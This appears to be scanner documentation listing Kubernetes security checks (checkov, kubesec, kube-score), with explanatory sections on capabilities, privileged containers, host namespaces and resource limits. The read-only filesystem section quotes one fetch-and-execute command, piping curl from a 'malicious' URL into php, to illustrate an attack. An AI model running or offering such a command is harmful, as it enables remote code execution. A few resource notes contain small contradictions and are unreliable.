# Kubernetes Best Practices

Scan use checkov, kubesec and kube-score for analyzing Kubernetes declarative configuration files. The results are not converted into [SARIF format](../integrations/sarif.md) yet and hence cannot be used as part of build breaker logic or viewed using the [VS Code extension](https://marketplace.visualstudio.com/items?itemName=shiftleftsecurity.shiftleft-scan).

Exhaustive checks carried out by scan are detailed below.

## Security Audits


|     | Id          | Type              | Entity                                | Policy                                                                                                                                                                                                   | IaC            |
|-----|-------------|-------------------|---------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------|
| 137 | CKV_K8S_32  | PodSecurityPolicy | PodSecurityPolicy                     | Ensure default seccomp profile set to docker/default or runtime/default                                                                                                                                  | Kubernetes     |
| 138 | CKV_K8S_6   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit root containers                                                                                                                                                                             | Kubernetes     |
| 139 | CKV_K8S_5   | PodSecurityPolicy | PodSecurityPolicy                     | Containers should not run with allowPrivilegeEscalation                                                                                                                                                  | Kubernetes     |
| 140 | CKV_K8S_1   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit containers wishing to share the host process ID namespace                                                                                                                                   | Kubernetes     |
| 141 | CKV_K8S_24  | PodSecurityPolicy | PodSecurityPolicy                     | Do not allow containers with added capability                                                                                                                                                            | Kubernetes     |
| 142 | CKV_K8S_2   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit privileged containers                                                                                                                                                                       | Kubernetes     |
| 143 | CKV_K8S_4   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit containers wishing to share the host network namespace                                                                                                                                      | Kubernetes     |
| 144 | CKV_K8S_3   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit containers wishing to share the host IPC namespace                                                                                                                                          | Kubernetes     |
| 145 | CKV_K8S_36  | PodSecurityPolicy | PodSecurityPolicy                     | Minimize the admission of containers with capabilities assigned                                                                                                                                          | Kubernetes     |
| 146 | CKV_K8S_7   | PodSecurityPolicy | PodSecurityPolicy                     | Do not admit containers with the NET_RAW capability                                                                                                                                                      | Kubernetes     |
| 147 | CKV_K8S_8   | PodSecurityPolicy | containers                            | Liveness Probe Should be Configured                                                                                                                                                                      | Kubernetes     |
| 148 | CKV_K8S_26  | PodSecurityPolicy | containers                            | Do not specify hostPort unless absolutely necessary                                                                                                                                                      | Kubernetes     |
| 149 | CKV_K8S_14  | PodSecurityPolicy | containers                            | Image Tag should be fixed - not latest or blank                                                                                                                                                          | Kubernetes     |
| 150 | CKV_K8S_37  | PodSecurityPolicy | containers                            | Minimize the admission of containers with capabilities assigned                                                                                                                                          | Kubernetes     |
| 151 | CKV_K8S_30  | PodSecurityPolicy | containers                            | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 152 | CKV_K8S_25  | PodSecurityPolicy | containers                            | Minimize the admission of containers with added capability                                                                                                                                               | Kubernetes     |
| 153 | CKV_K8S_43  | PodSecurityPolicy | containers                            | Image should use digest                                                                                                                                                                                  | Kubernetes     |
| 154 | CKV_K8S_15  | PodSecurityPolicy | containers                            | Image Pull Policy should be Always                                                                                                                                                                       | Kubernetes     |
| 155 | CKV_K8S_34  | PodSecurityPolicy | containers                            | Ensure that Tiller (Helm v2) is not deployed                                                                                                                                                             | Kubernetes     |
| 156 | CKV_K8S_16  | PodSecurityPolicy | containers                            | Container should not be privileged                                                                                                                                                                       | Kubernetes     |
| 157 | CKV_K8S_20  | PodSecurityPolicy | containers                            | Containers should not run with allowPrivilegeEscalation                                                                                                                                                  | Kubernetes     |
| 158 | CKV_K8S_10  | PodSecurityPolicy | containers                            | CPU requests should be set                                                                                                                                                                               | Kubernetes     |
| 159 | CKV_K8S_9   | PodSecurityPolicy | containers                            | Readiness Probe Should be Configured                                                                                                                                                                     | Kubernetes     |
| 160 | CKV_K8S_35  | PodSecurityPolicy | containers                            | Prefer using secrets as files over secrets as environment variables                                                                                                                                      | Kubernetes     |
| 161 | CKV_K8S_28  | PodSecurityPolicy | containers                            | Minimize the admission of containers with the NET_RAW capability                                                                                                                                         | Kubernetes     |
| 162 | CKV_K8S_33  | PodSecurityPolicy | containers                            | Ensure the Kubernetes dashboard is not deployed                                                                                                                                                          | Kubernetes     |
| 163 | CKV_K8S_11  | PodSecurityPolicy | containers                            | CPU limits should be set                                                                                                                                                                                 | Kubernetes     |
| 164 | CKV_K8S_12  | PodSecurityPolicy | containers                            | Memory requests should be set                                                                                                                                                                            | Kubernetes     |
| 165 | CKV_K8S_39  | PodSecurityPolicy | containers                            | Do not use the CAP_SYS_ADMIN linux capability                                                                                                                                                            | Kubernetes     |
| 166 | CKV_K8S_22  | PodSecurityPolicy | containers                            | Use read-only filesystem for containers where possible                                                                                                                                                   | Kubernetes     |
| 167 | CKV_K8S_13  | PodSecurityPolicy | containers                            | Memory limits should be set                                                                                                                                                                              | Kubernetes     |
| 168 | CKV_K8S_26  | PodSecurityPolicy | initContainers                        | Do not specify hostPort unless absolutely necessary                                                                                                                                                      | Kubernetes     |
| 169 | CKV_K8S_14  | PodSecurityPolicy | initContainers                        | Image Tag should be fixed - not latest or blank                                                                                                                                                          | Kubernetes     |
| 170 | CKV_K8S_37  | PodSecurityPolicy | initContainers                        | Minimize the admission of containers with capabilities assigned                                                                                                                                          | Kubernetes     |
| 171 | CKV_K8S_30  | PodSecurityPolicy | initContainers                        | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 172 | CKV_K8S_25  | PodSecurityPolicy | initContainers                        | Minimize the admission of containers with added capability                                                                                                                                               | Kubernetes     |
| 173 | CKV_K8S_43  | PodSecurityPolicy | initContainers                        | Image should use digest                                                                                                                                                                                  | Kubernetes     |
| 174 | CKV_K8S_15  | PodSecurityPolicy | initContainers                        | Image Pull Policy should be Always                                                                                                                                                                       | Kubernetes     |
| 175 | CKV_K8S_34  | PodSecurityPolicy | initContainers                        | Ensure that Tiller (Helm v2) is not deployed                                                                                                                                                             | Kubernetes     |
| 176 | CKV_K8S_16  | PodSecurityPolicy | initContainers                        | Container should not be privileged                                                                                                                                                                       | Kubernetes     |
| 177 | CKV_K8S_20  | PodSecurityPolicy | initContainers                        | Containers should not run with allowPrivilegeEscalation                                                                                                                                                  | Kubernetes     |
| 178 | CKV_K8S_10  | PodSecurityPolicy | initContainers                        | CPU requests should be set                                                                                                                                                                               | Kubernetes     |
| 179 | CKV_K8S_35  | PodSecurityPolicy | initContainers                        | Prefer using secrets as files over secrets as environment variables                                                                                                                                      | Kubernetes     |
| 180 | CKV_K8S_28  | PodSecurityPolicy | initContainers                        | Minimize the admission of containers with the NET_RAW capability                                                                                                                                         | Kubernetes     |
| 181 | CKV_K8S_33  | PodSecurityPolicy | initContainers                        | Ensure the Kubernetes dashboard is not deployed                                                                                                                                                          | Kubernetes     |
| 182 | CKV_K8S_11  | PodSecurityPolicy | initContainers                        | CPU limits should be set                                                                                                                                                                                 | Kubernetes     |
| 183 | CKV_K8S_12  | PodSecurityPolicy | initContainers                        | Memory requests should be set                                                                                                                                                                            | Kubernetes     |
| 184 | CKV_K8S_39  | PodSecurityPolicy | initContainers                        | Do not use the CAP_SYS_ADMIN linux capability                                                                                                                                                            | Kubernetes     |
| 185 | CKV_K8S_22  | PodSecurityPolicy | initContainers                        | Use read-only filesystem for containers where possible                                                                                                                                                   | Kubernetes     |
| 186 | CKV_K8S_13  | PodSecurityPolicy | initContainers                        | Memory limits should be set                                                                                                                                                                              | Kubernetes     |
| 187 | CKV_K8S_41  | PodSecurityPolicy | ServiceAccount                        | Ensure that default service accounts are not actively used                                                                                                                                               | Kubernetes     |
| 188 | CKV_K8S_21  | PodSecurityPolicy | ServiceAccount                        | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 189 | CKV_K8S_42  | PodSecurityPolicy | RoleBinding                           | Ensure that default service accounts are not actively used                                                                                                                                               | Kubernetes     |
| 190 | CKV_K8S_21  | PodSecurityPolicy | RoleBinding                           | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 191 | CKV_K8S_42  | PodSecurityPolicy | ClusterRoleBinding                    | Ensure that default service accounts are not actively used                                                                                                                                               | Kubernetes     |
| 192 | CKV_K8S_31  | PodSecurityPolicy | Pod                                   | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 193 | CKV_K8S_21  | PodSecurityPolicy | Pod                                   | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 194 | CKV_K8S_40  | PodSecurityPolicy | Pod                                   | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 195 | CKV_K8S_38  | PodSecurityPolicy | Pod                                   | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 196 | CKV_K8S_17  | PodSecurityPolicy | Pod                                   | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 197 | CKV_K8S_27  | PodSecurityPolicy | Pod                                   | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 198 | CKV_K8S_18  | PodSecurityPolicy | Pod                                   | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 199 | CKV_K8S_29  | PodSecurityPolicy | Pod                                   | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 200 | CKV_K8S_19  | PodSecurityPolicy | Pod                                   | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 201 | CKV_K8S_23  | PodSecurityPolicy | Pod                                   | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 202 | CKV_K8S_31  | PodSecurityPolicy | Deployment                            | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 203 | CKV_K8S_21  | PodSecurityPolicy | Deployment                            | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 204 | CKV_K8S_40  | PodSecurityPolicy | Deployment                            | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 205 | CKV_K8S_38  | PodSecurityPolicy | Deployment                            | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 206 | CKV_K8S_17  | PodSecurityPolicy | Deployment                            | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 207 | CKV_K8S_27  | PodSecurityPolicy | Deployment                            | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 208 | CKV_K8S_18  | PodSecurityPolicy | Deployment                            | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 209 | CKV_K8S_29  | PodSecurityPolicy | Deployment                            | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 210 | CKV_K8S_19  | PodSecurityPolicy | Deployment                            | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 211 | CKV_K8S_23  | PodSecurityPolicy | Deployment                            | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 212 | CKV_K8S_31  | PodSecurityPolicy | DaemonSet                             | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 213 | CKV_K8S_21  | PodSecurityPolicy | DaemonSet                             | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 214 | CKV_K8S_40  | PodSecurityPolicy | DaemonSet                             | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 215 | CKV_K8S_38  | PodSecurityPolicy | DaemonSet                             | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 216 | CKV_K8S_17  | PodSecurityPolicy | DaemonSet                             | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 217 | CKV_K8S_27  | PodSecurityPolicy | DaemonSet                             | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 218 | CKV_K8S_18  | PodSecurityPolicy | DaemonSet                             | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 219 | CKV_K8S_29  | PodSecurityPolicy | DaemonSet                             | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 220 | CKV_K8S_19  | PodSecurityPolicy | DaemonSet                             | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 221 | CKV_K8S_23  | PodSecurityPolicy | DaemonSet                             | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 222 | CKV_K8S_31  | PodSecurityPolicy | StatefulSet                           | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 223 | CKV_K8S_21  | PodSecurityPolicy | StatefulSet                           | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 224 | CKV_K8S_40  | PodSecurityPolicy | StatefulSet                           | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 225 | CKV_K8S_38  | PodSecurityPolicy | StatefulSet                           | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 226 | CKV_K8S_17  | PodSecurityPolicy | StatefulSet                           | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 227 | CKV_K8S_27  | PodSecurityPolicy | StatefulSet                           | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 228 | CKV_K8S_18  | PodSecurityPolicy | StatefulSet                           | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 229 | CKV_K8S_29  | PodSecurityPolicy | StatefulSet                           | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 230 | CKV_K8S_19  | PodSecurityPolicy | StatefulSet                           | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 231 | CKV_K8S_23  | PodSecurityPolicy | StatefulSet                           | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 232 | CKV_K8S_31  | PodSecurityPolicy | ReplicaSet                            | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 233 | CKV_K8S_21  | PodSecurityPolicy | ReplicaSet                            | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 234 | CKV_K8S_40  | PodSecurityPolicy | ReplicaSet                            | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 235 | CKV_K8S_38  | PodSecurityPolicy | ReplicaSet                            | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 236 | CKV_K8S_17  | PodSecurityPolicy | ReplicaSet                            | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 237 | CKV_K8S_27  | PodSecurityPolicy | ReplicaSet                            | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 238 | CKV_K8S_18  | PodSecurityPolicy | ReplicaSet                            | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 239 | CKV_K8S_29  | PodSecurityPolicy | ReplicaSet                            | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 240 | CKV_K8S_19  | PodSecurityPolicy | ReplicaSet                            | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 241 | CKV_K8S_23  | PodSecurityPolicy | ReplicaSet                            | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 242 | CKV_K8S_31  | PodSecurityPolicy | ReplicationController                 | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 243 | CKV_K8S_21  | PodSecurityPolicy | ReplicationController                 | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 244 | CKV_K8S_40  | PodSecurityPolicy | ReplicationController                 | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 245 | CKV_K8S_38  | PodSecurityPolicy | ReplicationController                 | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 246 | CKV_K8S_17  | PodSecurityPolicy | ReplicationController                 | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 247 | CKV_K8S_27  | PodSecurityPolicy | ReplicationController                 | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 248 | CKV_K8S_18  | PodSecurityPolicy | ReplicationController                 | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 249 | CKV_K8S_29  | PodSecurityPolicy | ReplicationController                 | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 250 | CKV_K8S_19  | PodSecurityPolicy | ReplicationController                 | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 251 | CKV_K8S_23  | PodSecurityPolicy | ReplicationController                 | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 252 | CKV_K8S_31  | PodSecurityPolicy | Job                                   | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 253 | CKV_K8S_21  | PodSecurityPolicy | Job                                   | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 254 | CKV_K8S_40  | PodSecurityPolicy | Job                                   | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 255 | CKV_K8S_38  | PodSecurityPolicy | Job                                   | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 256 | CKV_K8S_17  | PodSecurityPolicy | Job                                   | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 257 | CKV_K8S_27  | PodSecurityPolicy | Job                                   | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 258 | CKV_K8S_18  | PodSecurityPolicy | Job                                   | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 259 | CKV_K8S_29  | PodSecurityPolicy | Job                                   | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 260 | CKV_K8S_19  | PodSecurityPolicy | Job                                   | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 261 | CKV_K8S_23  | PodSecurityPolicy | Job                                   | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 262 | CKV_K8S_31  | PodSecurityPolicy | CronJob                               | Ensure that the seccomp profile is set to docker/default or runtime/default                                                                                                                              | Kubernetes     |
| 263 | CKV_K8S_21  | PodSecurityPolicy | CronJob                               | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 264 | CKV_K8S_40  | PodSecurityPolicy | CronJob                               | Containers should run as a high UID to avoid host conflict                                                                                                                                               | Kubernetes     |
| 265 | CKV_K8S_38  | PodSecurityPolicy | CronJob                               | Ensure that Service Account Tokens are only mounted where necessary                                                                                                                                      | Kubernetes     |
| 266 | CKV_K8S_17  | PodSecurityPolicy | CronJob                               | Containers should not share the host process ID namespace                                                                                                                                                | Kubernetes     |
| 267 | CKV_K8S_27  | PodSecurityPolicy | CronJob                               | Do not expose the docker daemon socket to containers                                                                                                                                                     | Kubernetes     |
| 268 | CKV_K8S_18  | PodSecurityPolicy | CronJob                               | Containers should not share the host IPC namespace                                                                                                                                                       | Kubernetes     |
| 269 | CKV_K8S_29  | PodSecurityPolicy | CronJob                               | Apply security context to your pods and containers                                                                                                                                                       | Kubernetes     |
| 270 | CKV_K8S_19  | PodSecurityPolicy | CronJob                               | Containers should not share the host network namespace                                                                                                                                                   | Kubernetes     |
| 271 | CKV_K8S_23  | PodSecurityPolicy | CronJob                               | Minimize the admission of root containers                                                                                                                                                                | Kubernetes     |
| 272 | CKV_K8S_21  | PodSecurityPolicy | Service                               | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 273 | CKV_K8S_21  | PodSecurityPolicy | Secret                                | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 274 | CKV_K8S_21  | PodSecurityPolicy | Role                                  | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 275 | CKV_K8S_21  | PodSecurityPolicy | ConfigMap                             | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |
| 276 | CKV_K8S_21  | PodSecurityPolicy | Ingress                               | The default namespace should not be used                                                                                                                                                                 | Kubernetes     |


## containers[].resources.limits.cpu

Also containers[].resources.requests.cpu

When Containers have resource requests specified the scheduler can make better decisions about which nodes to place Pods on and how to deal with resource contention.

Limits and requests for CPU resources are measured in cpu units. Kubernetes judges these as:

- 1 AWS vCPU
- 1 GCP Core
- 1 Azure vCore
- 1 Hyperthread on a bare-metal Intel processor with Hyperthreading

### Notes

- Fractional requests are allowed.
- CPU is always requested as an absolute quantity, never as a relative quantity; 0.1 is the same amount of CPU on a single-core, dual-core, or 48-core machine.
- Each node has a maximum capacity for each of the resource types: the amount of CPU and memory it can provide for Pods
- Although actual memory or CPU resource usage on nodes is very low, the scheduler still refuses to place a Pod on a node if the capacity check fails
- If a CPU limit is not applied, the namespace’s limit is automatically assigned via a LimitRange. If this does not exist there is no upper bound to the memory a container can use

### External Links

- [Manage Container Compute Resources](https://kubernetes.io/docs/concepts/configuration/manage-compute-resources-container/)
- [Kubernetes Docs: Assign CPU Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-cpu-resource/)
- [Kubernetes Docs: Configure Memory and CPU Quotas for a Namespace](https://kubernetes.io/docs/tasks/administer-cluster/quota-memory-cpu-namespace/)
- [Configure Quality of Service for Pods](https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/)

## containers[].resources.limits.memory

Also containers[].resources.requests.memory

When Containers have resource requests specified the scheduler can make better decisions about which nodes to place Pods on and how to deal with resource contention.

Limits and requests for memory are measured in bytes. You can express memory as a plain integer or as a fixed-point integer using one of these suffixes: E, P, T, G, M, K. You can also use the power-of-two equivalents: Ei, Pi, Ti, Gi, Mi, Ki. For example, the following represent roughly the same value:

### Example

```yaml
resources:
  limits:
    memory: 200Mi
  requests:
    memory: 100Mi
```

### Notes

- A Container can exceed its memory request if the Node has memory available, although this is not allowed
- If a Container allocates more memory than its limit, the Container becomes a candidate for termination. It will be terminated if it continues to consume memory beyond its limit
- The memory request for the Pod is the sum of the memory requests for all the Containers in the Pod
- If a memory limit is not applied, the namespace’s limit is automatically assigned via a LimitRange. If this does not exist there is no upper bound to the memory a container can use

### External Links

- [Manage Container Compute Resources](https://kubernetes.io/docs/concepts/configuration/manage-compute-resources-container/)
- [Kubernetes Docs: Assign Memory Resources to Containers and Pods](https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/)
- [Kubernetes Docs: Configure Memory and CPU Quotas for a Namespace](https://kubernetes.io/docs/tasks/administer-cluster/quota-memory-cpu-namespace/)
- [Configure Quality of Service for Pods](https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/)

## containers[].securityContext.capabilities.add | index("SYS_ADMIN")

Also containers[].securityContext.capabilities.drop | index("ALL")

CAP_SYS_ADMIN is the most privileged capability and should always be avoided

Capabilities permit certain named root actions without giving full root access. They are a more fine-grained permissions model, and all capabilities should be dropped from a pod, with only those required added back.

There are a large number of capabilities, with CAP_SYS_ADMIN bounding most. Never enable this capability - it’s equivalent to root.

```yaml
apiVersion: extensions/v1beta1
kind: Deployment
---
containers:
  - name: payment
    image: nginx
    securityContext:
      capabilities:
        drop:
          - all
        add:
          - NET_BIND_SERVICE
```

### Notes

- Drop all capabilities from a pod as above
- Add only those required
- Run a comprehensive test suite to ensure security extensions have not blocked functionality that your containers or pods require

### External Links

- [Kubernetes Docs: Set capabilities for a Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)

## containers[].securityContext.privileged == true

Privileged containers can allow almost completely unrestricted host access

Privileged containers share namespaces with the host system, eschew cgroup restrictions, and do not offer any security. They should be used exclusively as a bundling and distribution mechanism for the code in the container, and not for isolation.

### Notes

- Processes within the container get almost the same privileges that are available to processes outside a container
- Privileged containers have significantly fewer kernel isolation features
- root inside a privileged container is close to root on the host as User Namespaces are not enforced
- Privileged containers shared /dev with the host, which allows mounting of the host’s filesystem
- They can also interact with the kernel to load kernel and alter settings (including the hostname), interfere with the network stack, and many other subtle permissions

### External Links

- [Kubernetes Docs: Privileged mode for pod containers](https://kubernetes.io/docs/concepts/workloads/pods/pod/#privileged-mode-for-pod-containers)

## containers[].securityContext.readOnlyRootFilesystem == true

An immutable root filesystem can prevent malicious binaries being added to PATH and increase attack cost

An immutable root filesystem prevents applications from writing to their local disk. This is desirable in the event of an intrusion as the attacker will not be able to tamper with the filesystem or write foreign executables to disk.

However if there are runtimes available in the container then this is not sufficient to prevent code execution. Consider curl http://malicious.php | php or bash -c "echo 'much pasted code'".

### Notes

- Immutable filesystems will prevent your application writing to disk. There may be a requirement for temporary files or local caching, in which case an emptyDir volume can be mounted with type Memory
- Any volume mounted into the container will have its own filesystem permissions
- Scratch containers are an ideal candidate for immutableRootFilesystem - they contain only your code, minimal dev, etc, proc, and sys, and so need a runtime (or injection into the scratch binary) to execute code. Without a writable filesystem the attack surface is dramatically reduced.

### External Links

- [Kubernetes Docs: Volumes](https://kubernetes.io/docs/concepts/storage/volumes/#emptydir)

## containers[].securityContext.runAsNonRoot == true

Also containers[].securityContext.runAsUser > 10000

- Force the running image to run as a non-root user to ensure least privilege
- Indicates that containers should run as non-root user.

### Notes

- Container level security context settings are applied to the specific container and override settings made at the pod level where there is overlap
- Container level settings are not applied to the pod’s volumes.

To configure run as user:

- MustRunAs - Requires a range to be configured. Uses the first value of the range as the default. Validates against the configured range.
- MustRunAsNonRoot - Requires that the pod be submitted with a non-zero runAsUser or have the USER directive defined in the image. No default provided.
- RunAsAny - No default provided. Allows any runAsUser to be specified.

### External Links

- [Kubernetes Docs: Pod Security Policy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#runasuser)

## securityContext capabilities

Reducing kernel capabilities available to a container limits its attack surface

Capabilities permit certain named root actions without giving full root access. They are a more fine-grained permissions model, and all capabilities should be dropped from a pod, with only those required added back.

There are a large number of capabilities, with CAP_SYS_ADMIN bounding most. Never enable this capability - it’s equivalent to root.

```yaml
apiVersion: extensions/v1beta1
kind: Deployment
---
containers:
  - name: payment
    image: nginx
    securityContext:
      capabilities:
        drop:
          - all
        add:
          - NET_BIND_SERVICE
```

### Notes

- Drop all capabilities from a pod as above
- Add only those required
- Run a comprehensive test suite to ensure security extensions have not blocked functionality that your containers or pods require

### External Links

- [Kubernetes Docs: Set capabilities for a Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)

## Service Accounts

Service accounts restrict Kubernetes API access and should be configured with least privilege

ServiceAccounts provide bot users for cluster access. These accounts can be configured with least privilege, reducing the risk of a vulnerability in the code that account runs being able to pivot into other services.

##.metadata.annotations."container.apparmor.security.beta.kubernetes.io/nginx"

Well defined AppArmor policies may provide greater protection from unknown threats. WARNING: NOT PRODUCTION READY

This feature is a proof-of-concept and should not be used in production.

### External Links

- [Kubernetes Docs: AppArmor](https://github.com/kubernetes/contrib/tree/master/apparmor/loader)

##.metadata.annotations."container.seccomp.security.alpha.kubernetes.io/pod"

Also .metadata.annotations."seccomp.security.alpha.kubernetes.io/pod"

Seccomp profiles for OpenShift set minimum privilege and secure against unknown threats

Seccomp is a system call filtering facility in the Linux kernel which lets applications define limits on system calls they may make, and what should happen when system calls are made. Seccomp is used to reduce the attack surface available to applications. source

Specify a Seccomp profile for all containers of the Pod:

```yaml
seccomp.security.alpha.kubernetes.io/pod
```

Specify a Seccomp profile for an individual container:

```yaml
container.seccomp.security.alpha.kubernetes.io/${container_name}
```

### External Links

- [Seccomp Design doc](https://github.com/kubernetes/kubernetes/blob/release-1.4/docs/design/seccomp.md)
- [OCI Runtime Spec](https://github.com/opencontainers/runtime-spec/blob/master/config-linux.md#seccomp)
- [Seccomp filtering at Kernel.org](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt)
- [Linux Seccomp examples](https://github.com/torvalds/linux/tree/master/samples/seccomp)

##.spec.hostAliases

Managing /etc/hosts aliases can prevent Docker from modifying the file after a pod’s containers have already been started

##.spec.hostIPC

Sharing the host’s IPC namespace allows container processes to communicate with processes on the host

Removing namespaces from pods reduces isolation and allows the processes in the pod to perform tasks as if they were running natively on the host.

This circumvents the protection models that containers are based on and should only be done with absolutely certainty (for example, for low-level observation of other containers).

##.spec.hostNetwork

Sharing the host’s network namespace permits processes in the pod to communicate with processes bound to the host’s loopback adapter

Removing namespaces from pods reduces isolation and allows the processes in the pod to perform tasks as if they were running natively on the host.

This circumvents the protection models that containers are based on and should only be done with absolutely certainty (for example, for low-level observation of other containers).

##.spec.hostPID

Sharing the host’s PID namespace allows visibility of processes on the host, potentially leaking information such as environment variables and configuration

Removing namespaces from pods reduces isolation and allows the processes in the pod to perform tasks as if they were running natively on the host.

This circumvents the protection models that containers are based on and should only be done with absolutely certainty (for example, for low-level observation of other containers).

##.spec.volumeClaimTemplates[].spec.accessModes | index("ReadWriteOnce")

ReadWriteMany mode should be avoided

##.spec.volumeClaimTemplates[].spec.resources.requests.storage

##.spec.volumes[].hostPath.path == "/var/run/docker.sock"

Mounting the docker.socket leaks information about other containers and can allow container breakout

## ingress-targets-service

Makes sure that the Ingress targets a Service

## cronjob-has-deadline

Makes sure that all CronJobs has a configured deadline

## container-resources

Makes sure that all pods have resource limits and requests set. The --ignore-container-cpu-limit flag can be used to disable the requirement of having a CPU limit

!!! Note
Additional related checks performed

    | Check | Comment|
    |-------|--------|
    | container-resource-requests-equal-limits | Makes sure that all pods have the same requests as limits on resources set. |
    | container-cpu-requests-equal-limits | Makes sure that all pods have the same CPU requests as limits set. |
    | container-memory-requests-equal-limits | Makes sure that all pods have the same memory requests as limits set. |
    | container-image-tag | Makes sure that a explicit non-latest tag is used |
    | container-image-pull-policy | Makes sure that the pullPolicy is set to Always. This makes sure that imagePullSecrets are always validated. |

## statefulset-has-poddisruptionbudget

Makes sure that all StatefulSets are targeted by a PDB

## deployment-has-poddisruptionbudget

Makes sure that all Deployments are targeted by a PDB

## pod-networkpolicy

Makes sure that all Pods are targeted by a NetworkPolicy

## networkpolicy-targets-pod

